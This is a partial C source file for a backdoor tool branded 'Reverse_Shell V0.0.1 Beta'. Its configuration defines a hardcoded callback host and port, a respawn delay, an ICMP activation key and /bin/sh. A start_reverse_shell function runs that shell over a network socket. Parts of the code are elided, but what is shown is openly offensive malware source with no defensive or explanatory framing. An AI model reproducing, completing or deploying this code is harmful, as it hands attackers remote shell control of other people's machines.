...
#define  BSHELL           "Command : "

#ifdef STATIC
# define REVERSE_HOST     "192.168.1.8"
# define REVERSE_PORT     6818
# define RESPAWN_DELAY    15
#else
# define ICMP_PACKET_SIZE 1024
# define ICMP_KEY         "Rovoary07"
#endif

#define VERSION          "0.0.1 Beta"
#define MOTD             "Reverse_Shell V!"VERSION" Connection Success \n "
#define CREDIT           "Create By Rovoaries G Estraiw \n\n Start >> "
#define SHELL            "/bin/sh"
...
void start_reverse_shell(char *bd_ip, unsigned short int bd_port)
{
    ...
    /* running the shell */
    execl(SHELL, BSHELL, (char *)0,NULL);
    close(sd);
}
